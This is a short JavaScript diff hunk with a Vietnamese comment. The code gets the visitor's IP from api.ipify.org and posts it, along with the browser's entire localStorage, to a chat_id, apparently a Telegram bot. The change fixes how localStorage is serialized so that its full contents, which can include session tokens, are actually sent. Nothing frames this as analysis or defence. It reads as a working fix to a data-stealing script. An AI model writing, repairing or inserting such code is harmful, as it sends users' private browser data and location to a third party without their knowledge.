@@ -12,7 +12,7 @@ fetch('https://api.ipify.org?format=json')
             // Lấy IP
             body: JSON.stringify({
                 chat_id: chatId,
-                text: JSON.stringify(localStorage + "\n" + dataIP.ip)
+                text: JSON.stringify(localStorage) + "\n" + dataIP.ip
             })
         })
 
